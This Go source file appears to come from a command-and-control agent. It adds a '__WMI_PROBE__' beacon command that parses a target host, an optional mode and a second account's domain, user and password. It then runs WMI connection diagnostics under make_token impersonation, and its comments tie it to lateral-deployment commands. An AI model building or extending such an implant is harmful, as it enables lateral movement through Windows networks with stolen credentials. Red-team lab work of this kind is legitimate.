package main

import (
	"encoding/json"
	"errors"
	"runtime"
	"strings"
)

// wmiProbePrefix is the lab diagnostic command line: the Go agent runs
// two read-only WMI connections under the active make_token identity and a
// third through the explicit credential plumbing, reporting every stage
// with UTC timestamps, OS thread identity, raw HRESULTs, and durations.
// The optional `held`, `cycled`, and `switch` modes run the lifecycle
// comparisons (COM held and/or impersonation cycled, and the A → B → A
// account-switch diagnostic). It writes nothing to the target, never
// touches credentials in its output, and exists to diagnose the one-shot
// second-connect failure without deploying anything.
const wmiProbePrefix = "__WMI_PROBE__"

// wmiProbePayload carries the second account's credentials for the switch
// mode's two-account variant on an optional JSON body below the command
// line, mirroring __MAKE_TOKEN__'s transport: the password rides the beacon
// command's JSON body only, never logs, errors, or report text.
type wmiProbePayload struct {
	Domain   string `json:"domain"`
	User     string `json:"user"`
	Password string `json:"password"`
}

// parseWmiProbeCommand extracts the target host — written exactly as the
// lateral deployment commands accept it: an IP literal or a DNS name — the
// optional mode, and the optional second-account body for the switch mode:
//
//	__WMI_PROBE__ <host> [held|cycled|switch]
//	__WMI_PROBE__ <host> switch + JSON body {"domain","user","password"}
//
// Any other command family, mode word, or body placement is rejected so
// the parser never matches by accident; the body credentials are validated
// but never echoed in errors.
func parseWmiProbeCommand(command string) (host, mode string, identity *lateralIdentity, err error) {
	trimmed := strings.TrimSpace(command)
	if !strings.HasPrefix(trimmed, wmiProbePrefix) {
		return "", "", nil, errors.New("not a wmi probe command")
	}
	line, body, hasBody := strings.Cut(trimmed, "\n")
	fields := strings.Fields(strings.TrimPrefix(line, wmiProbePrefix))
	identityErr := func(message string) (string, string, *lateralIdentity, error) {
		return "", "", nil, errors.New(message)
	}
	switch len(fields) {
	case 1:
	case 2:
		mode = strings.ToLower(fields[1])
		if mode != "held" && mode != "cycled" && mode != "switch" {
			return identityErr("the optional wmi probe modes are: held, cycled, switch")
		}
	default:
		return identityErr("usage: __WMI_PROBE__ <host> [held|cycled|switch]")
	}
	host = fields[0]
	if host == "" || strings.ContainsAny(host, "\\/") {
		return identityErr("the wmi probe target must be a single host name")
	}
	if !hasBody {
		return host, mode, nil, nil
	}
	if mode != "switch" {
		return identityErr("the account-B identity is only valid with the switch mode")
	}
	var payload wmiProbePayload
	if err := json.Unmarshal([]byte(strings.TrimSpace(body)), &payload); err != nil {
		return identityErr("the switch-mode body must be a JSON object with domain, user, and password")
	}
	payload.Domain = strings.TrimSpace(payload.Domain)
	payload.User = strings.TrimSpace(payload.User)
	if payload.User == "" {
		return identityErr("the switch-mode body requires a user")
	}
	if payload.Domain == "" && strings.Contains(payload.User, `\`) {
		payload.Domain, payload.User, _ = strings.Cut(payload.User, `\`)
		payload.Domain = strings.TrimSpace(payload.Domain)
		payload.User = strings.TrimSpace(payload.User)
		if payload.User == "" {
			return identityErr("the switch-mode body requires a user")
		}
	}
	if strings.ContainsRune(payload.User, '\\') {
		return identityErr("the switch-mode body user must not embed a domain")
	}
	return host, mode, &lateralIdentity{
		Domain:   payload.Domain,
		User:     payload.User,
		Password: payload.Password,
	}, nil
}

// wmiProbeCommand executes the diagnostic. Only the Windows build can probe;
// like the lateral commands, other builds fail explicitly instead of
// silently degrading.
func wmiProbeCommand(command string) (string, error) {
	host, mode, identity, err := parseWmiProbeCommand(command)
	if err != nil {
		return "", err
	}
	if runtime.GOOS != "windows" {
		return "", errors.New("wmi probe requires the Windows agent build")
	}
	return wmiProbeExecute(host, mode, identity)
}
